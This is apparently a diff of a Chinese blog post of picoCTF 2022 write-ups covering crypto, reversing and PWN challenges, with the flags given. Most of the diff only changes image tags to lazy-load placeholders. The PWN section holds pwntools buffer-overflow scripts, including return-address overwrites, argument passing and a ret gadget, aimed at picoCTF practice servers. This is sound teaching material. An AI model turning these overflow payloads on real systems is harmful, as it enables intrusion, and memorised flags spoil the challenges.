id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2025/07/10/picoCTF2022/"><header><a href="/tags/WP/" tabindex="-1" itemprop="url">WP</a><h1 id="CrawlerTitle" itemprop="name headline">picoCTF2022</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">John Doe</span><time itemprop="dateCreated datePublished" datetime="2025-07-10T04:06:13.000Z" title="Created 2025-07-10 12:06:13">2025-07-10</time><time itemprop="dateCreated datePublished" datetime="2025-07-14T07:25:49.743Z" title="Updated 2025-07-14 15:25:49">2025-07-14</time></header><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenere"></a>Vigenere</h3><p>题目信息</p>
 <p>key <code>CYLAB</code></p>
 <p>cipher:  <code>rgnoDVD&#123;O0NU_WQ3_G1G3O3T3_A1AH3S_cc82272b&#125;</code></p>
 <p>题目给了密文和密钥，用随波逐流打开，解密，发现是维吉尼亚加密</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707145151937.png" alt="image-20250707145151937"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707145151937.png" alt="image-20250707145151937"></p>
 <p>flag:<strong>picoCTF{D0NT_US3_V1G3N3R3_C1PH3R_ae82272q}</strong></p>
 <h3 id="basic-mod1"><a href="#basic-mod1" class="headerlink" title="basic-mod1"></a>basic-mod1</h3><p>题目信息</p>
 <p>描述： 我们发现这个奇怪的消息在服务器上传递，我们认为我们有一个有效的 decrpytion 方案。取每个数字 mod 37 并将其映射到以下字符集：0-25 是字母表（大写），26-35 是十进制数字，36 是下划线。以 picoCTF 标志格式包装解密的消息（即 picoCTF{decrypted_message}）</p>
@@ -320,7 +234,7 @@
 
 
 <p>正如代码中的注释一样，用户输入密码，进行Base64编码，调用函数检验编码厚的数值是否符合指定字符，所以密码就是指定字符Base64解码</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707160725424.png" alt="image-20250707160725424"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707160725424.png" alt="image-20250707160725424"></p>
 <p>flag：<strong>picoCTF{pl3as3_l3t_m3_1nt0_th3_saf3}</strong></p>
 <h3 id="GDB-test"><a href="#GDB-test" class="headerlink" title="GDB test"></a>GDB test</h3><p>题目信息</p>
 <p>你能得到这面旗帜吗？</p>
@@ -329,45 +243,45 @@
 
 <p>解密</p>
 <p>按照给的命令进行操作</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707160953950.png" alt="image-20250707160953950"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707160953950.png" alt="image-20250707160953950"></p>
 <p>flag: <strong>picoCTF{d3bugg3r_dr1v3_7776d758}</strong></p>
 <h3 id="fresh-java"><a href="#fresh-java" class="headerlink" title="fresh-java"></a>fresh-java</h3><p>题目信息</p>
 <p>你能得到这面旗帜吗？对这个 <a target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c/197/KeygenMe.class">Java 程序</a>进行逆向工程</p>
 <p>用jad-gui打开这个文件，发现该密文已将被定义好了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707161219444.png" alt="image-20250707161219444"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707161219444.png" alt="image-20250707161219444"></p>
 <p>flag：<strong>picoCTF{700l1ng_r3qu1r3d_738cac89}</strong></p>
 <h3 id="file-run1"><a href="#file-run1" class="headerlink" title="file-run1"></a>file-run1</h3><p>题目信息</p>
 <p>已为您提供一个程序，如果您尝试在命令行上运行它会发生什么？</p>
 <p>解密</p>
 <p>首先要为程序赋权限  <code>chmod +x ru</code></p>
 <p>运行该程序并且执行命令.&#x2F;run</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707163210981.png" alt="image-20250707163210981"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707163210981.png" alt="image-20250707163210981"></p>
 <p>flag:<strong>picoCTF{U51N6_Y0Ur_F1r57_F113_9bc52b6b}</strong></p>
 <h3 id="file-run2"><a href="#file-run2" class="headerlink" title="file-run2"></a>file-run2</h3><p>题目信息</p>
 <p>另一个程序，但这一次，它似乎需要一些输入。如果您尝试在命令行上运行它并输入 “Hello！”会发生什么情况？</p>
 <p>解密</p>
 <p>首先要为程序赋权限  <code>chmod +x ru</code></p>
 <p>运行该程序并且执行命令.&#x2F;run Hello!</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707162758640.png" alt="image-20250707162758640"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707162758640.png" alt="image-20250707162758640"></p>
 <p>flag:<strong>picoCTF{F1r57_4rgum3n7_f65ed63e}</strong></p>
 <h3 id="Bbbbloat"><a href="#Bbbbloat" class="headerlink" title="Bbbbloat"></a>Bbbbloat</h3><p>题目信息</p>
 <p>你能得到这面旗帜吗？对这个<a target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c/47/bbbbloat">二进制文件</a>进行逆向工程。</p>
 <p>解密</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707165659990.png" alt="image-20250707165659990"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707165659990.png" alt="image-20250707165659990"></p>
 <p>分析得到，最喜欢的是数字应该为549255</p>
 <p>为文件赋权限 <code>chmod +x Bbbbloat</code></p>
 <p>运行程序<code>./Bbbbloat</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707165748259.png" alt="image-20250707165748259"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707165748259.png" alt="image-20250707165748259"></p>
 <p>flag：<strong>picoCTF{cu7_7h3_bl047_44f74a60}</strong></p>
 <h3 id="unpackme"><a href="#unpackme" class="headerlink" title="unpackme"></a>unpackme</h3><p>题目描述</p>
 <p>你能得到这面旗帜吗？对这个<a target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c/204/unpackme-upx">二进制文件</a>进行逆向工程。</p>
 <p>解密</p>
 <p>文件以upx结尾，尝试upx脱壳</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707205131371.png" alt="image-20250707205131371"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707205131371.png" alt="image-20250707205131371"></p>
 <p>之后拖入ida中</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707205428033.png" alt="image-20250707205428033"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707205428033.png" alt="image-20250707205428033"></p>
 <p>发现最喜爱的数字是754635</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707205352953.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707205352953.png"></p>
 <p>flag: <strong>picoCTF{up&gt;&lt;_m3_f7w_e510a27f}</strong></p>
 <h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="RPS"><a href="#RPS" class="headerlink" title="RPS"></a>RPS</h3><p>题目描述</p>
 <p>这是一个对你玩石头剪刀布的程序。我听说如果你连续赢了 5 次，就会发生好事。可以下载带有标记已编辑的程序源代码 <a target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c/145/game-redacted.c">这里 </a>。</p>
@@ -403,14 +317,14 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">static void data_read() &#123;</span><br><span class="line">  char entry[4];</span><br><span class="line">  long entry_number;</span><br><span class="line">  char output[100];</span><br><span class="line">  int r;</span><br><span class="line"></span><br><span class="line">  memset(output, &#x27;\0&#x27;, 100);</span><br><span class="line">  </span><br><span class="line">  printf(&quot;Please enter the entry number of your data:\n&quot;);</span><br><span class="line">  r = tgetinput(entry, 4);</span><br><span class="line">  // Timeout on user input</span><br><span class="line">  if(r == -3)</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Goodbye!\n&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  if ((entry_number = strtol(entry, NULL, 10)) == 0) &#123;//尝试将 entry 字符串的开头部分解析成一个十进制的长整型数值，</span><br><span class="line">    puts(flag);</span><br><span class="line">    fseek(stdin, 0, SEEK_END);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  entry_number--;</span><br><span class="line">  strncpy(output, data[entry_number], input_lengths[entry_number]);</span><br><span class="line">  puts(output);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>所以重点就是<code>((entry_number = strtol(entry, NULL, 10)) == 0)</code>的输出结果为0</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708105757613.png" alt="image-20250708105757613"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708112024405.png" alt="image-20250708112024405"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708105757613.png" alt="image-20250708105757613"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708112024405.png" alt="image-20250708112024405"></p>
 <p>flag:<strong>picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_68466E2F}</strong></p>
 <h3 id="buffer-overflow-0"><a href="#buffer-overflow-0" class="headerlink" title="buffer overflow 0"></a>buffer overflow 0</h3><p>题目信息</p>
 <p>让我们从简单的开始，你能溢出正确的缓冲区吗？该程序可<a target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c/173/vuln">在此处</a>获得。您可以查看源代码 <a target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c/173/vuln.c">这里 </a>。</p>
 <p>解密</p>
 <p>主函数</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708113508462.png" alt="image-20250708113508462"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708113508462.png" alt="image-20250708113508462"></p>
 <p> <code>signal(11, sigsegv_handler)</code>当程序发生段错误（即收到信号 11，也就是 <code>SIGSEGV</code>）时，不执行默认操作（崩溃），而是跳转到你定义的 <code>sigsegv_handler</code> 函数进行处理。 </p>
 <ul>
 <li>当你的程序试图访问非法内存地址（如未分配的内存、只读内存、已释放的内存等）时，操作系统会发送这个信号给程序。</li>
@@ -427,10 +341,10 @@
 <p>它包含了读取flag,并把flag输出在终端</p>
 <p>而在 Linux&#x2F;Unix 系统中，<code>/bin/sh</code> 是一个指向系统默认 shell（如 Bash）的可执行文件</p>
 <p><code>sigsegv_handler</code>函数</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708113612456.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708113612456.png"></p>
 <p>该函数会输出flag</p>
 <p>所以只需要实现就可以输出flag</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708115309806.png" alt="image-20250708115309806"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708115309806.png" alt="image-20250708115309806"></p>
 <h4 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&quot;saturn.picoctf.net&quot;, 62318)</span><br><span class="line">p.sendline(b&#x27;a&#x27;*20)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
@@ -446,8 +360,8 @@
 <h2 id="buffer-overflow-1"><a href="#buffer-overflow-1" class="headerlink" title="buffer overflow 1"></a>buffer overflow 1</h2><p>题目描述</p>
 <p>控制退货地址现在我们开始烹饪了！您可以溢出缓冲区并返回到<a target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c/187/vuln">程序</a>中的 flag 函数。你可以<a target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c/187/vuln.c">在这里</a>查看源代码。</p>
 <p>解密</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708153920298.png" alt="image-20250708153920298"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708143530328.png" alt="image-20250708143530328"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708153920298.png" alt="image-20250708153920298"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708143530328.png" alt="image-20250708143530328"></p>
 <p><strong><code>var_4</code> 是什么？</strong></p>
 <ul>
 <li>在汇编或反编译工具（如 IDA Pro）中，<code>var_4</code> 是一个由工具自动生成的名称，用于表示一个位于栈上的局部变量。它通常是原始C代码中没有明确命名的变量，或者是编译器为了优化或内部使用而创建的栈空间。</li>
@@ -460,7 +374,7 @@
 <li>因此，<code>var_4</code> 的大小是 <strong>4 字节</strong>。</li>
 </ul>
 <p>所以垃圾字节要填充36+4+4&#x3D;44个字节</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708154044161.png" alt="win"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708154044161.png" alt="win"></p>
 <p><code>win</code>是后门函数</p>
 <p>填充它的地址</p>
 <h4 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&quot;saturn.picoctf.net&quot;, 59895)</span><br><span class="line">p.sendline(b&#x27;a&#x27;*44+p32(0x080491F6))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
@@ -474,14 +388,14 @@
 <h3 id="buffer-overflow-2"><a href="#buffer-overflow-2" class="headerlink" title="buffer overflow 2"></a>buffer overflow 2</h3><p>题目描述</p>
 <p>控制返回地址和参数这一次，您需要控制您返回的函数的参数！您可以从此<a target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c/144/vuln">程序</a>中获取标志吗？你可以<a target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c/144/vuln.c">在这里</a>查看源代码</p>
 <p>解密</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708171855335.png" alt="image-20250708171855335"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708171855335.png" alt="image-20250708171855335"></p>
 <p>s距离返回地址是6C+4个字节</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708172840005.png" alt="image-20250708172840005"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708172840005.png" alt="image-20250708172840005"></p>
 <p>要传参，32位是参数从<strong>右到左</strong>依次压入栈中</p>
 <p>win的地址</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708173339016.png" alt="image-20250708173339016"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708173339016.png" alt="image-20250708173339016"></p>
 <h4 id="gdb动调查看"><a href="#gdb动调查看" class="headerlink" title="gdb动调查看"></a>gdb动调查看</h4><p><code>python wp.py</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708194558739.png" alt="image-20250708194558739"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708194558739.png" alt="image-20250708194558739"></p>
 <p>执行的函数列表</p>
 <h4 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"># 本地</span><br><span class="line"># ex = process(&#x27;./vuln&#x27;)</span><br><span class="line"># 远程</span><br><span class="line">p = remote(&#x27;saturn.picoctf.net&#x27;, 62974)</span><br><span class="line">payload = b&#x27;a&#x27;*112+p32(0x08049296)+p32(0)+p32(0xCAFEF00D)+p32(0xF00DF00D)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"># p.inter</span><br><span class="line">print(p.recvall())</span><br></pre></td></tr></table></figure>
 
@@ -500,18 +414,18 @@
 <p>解密</p>
 <p>这一题我错了很久，最后发现考了堆栈平衡:crying_cat_face:</p>
 <p>但是也学到了一些gdb调试获取信息的方法</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708211430828.png" alt="image-20250708211430828"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708211442960.png" alt="image-20250708211442960"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708205411585.png" alt="image-20250708205411585"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708211430828.png" alt="image-20250708211430828"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708211442960.png" alt="image-20250708211442960"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708205411585.png" alt="image-20250708205411585"></p>
 <p><strong>gdb调试获得相关信息</strong></p>
 <p><code>readelf -s vuln</code>显示所有函数的信息（在gdb调试之前）</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708210826386.png" alt="image-20250708210826386"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708210826386.png" alt="image-20250708210826386"></p>
 <p><code>p flag</code>：显示函数flag的信息</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708210712578.png" alt="image-20250708210712578"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708210712578.png" alt="image-20250708210712578"></p>
 <p>（gdb）disassemble vuln：找要填充的字节数（）</p>
 <p>64位时是0x40+8</p>
 <p>32位时是0x40+4</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708211147269.png" alt="image-20250708211147269"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708211147269.png" alt="image-20250708211147269"></p>
 <h4 id="堆栈平衡"><a href="#堆栈平衡" class="headerlink" title="堆栈平衡"></a>堆栈平衡</h4><p>同一个程序的每一个 <code>call</code> 指令执行时，<code>rsp</code>（栈指针）的<strong>绝对值不一定相同</strong>，但其<strong>对齐状态</strong>是保持一致的。</p>
 <p>当 <code>vuln</code> 函数通过 <code>ret</code> 指令跳转到 <code>flag</code> 函数时，<code>flag</code> 函数的入口处 <code>rsp</code> (栈指针) 可能满足 <code>rsp % 16 == 0</code> (即 16 字节对齐)。但是，<code>flag</code> 函数的序言 (prologue) 通常会 <code>push rbp</code> (将 <code>rbp</code> 压栈)，这会使 <code>rsp</code> 减去 8 字节，导致 <code>rsp % 16 == 8</code> (8 字节不对齐)。</p>
 <p>问题就出在这里：<strong>在执行任何 <code>call</code> 指令之前，<code>rsp</code> 必须是 16 字节对齐的。</strong></p>
@@ -530,219 +444,153 @@
 <p>该函数是flag被调用函数输出flag，所以在flag函数中的第一个call的地方下断点</p>
 <p><code>python 你的脚本文件名.py</code>：运行脚本</p>
 <p><code>info registers rsp</code>：查看rsp的寄存器信息</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708215558325.png" alt="image-20250708215558325"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250708215558325.png" alt="image-20250708215558325"></p>
 <p>看最后两位  </p>
 <p>0x48可以整除16，所以现在堆栈平衡了</p>
 <h4 id="脚本-4"><a href="#脚本-4" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># p = process(&#x27;./vuln&#x27;)</span><br><span class="line"># gdb.attach(p, gdbscript=&#x27;b *0x08049370\ncontinue&#x27;)</span><br><span class="line">p = remote(&quot;saturn.picoctf.net&quot;, 50442)</span><br><span class="line"></span><br><span class="line"># 之前找到的 flag 函数地址</span><br><span class="line">flag_address = 0x00401236 </span><br><span class="line"></span><br><span class="line"># 在你的二进制文件中找到一个 ret 小工具的地址</span><br><span class="line"># 假设你找到的是 0x0040101a，请替换为你在 GDB/ROPgadget 中找到的实际地址</span><br><span class="line">ret_gadget_address = 0x0040101a </span><br><span class="line"></span><br><span class="line"># 构建 payload：填充 + ret_gadget_address + flag_address</span><br><span class="line">payload = b&#x27;A&#x27; * (0x40 + 8) + p64(ret_gadget_address) + p64(flag_address)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">print(p.recvall())</span><br></pre></td></tr></table></figure>
 
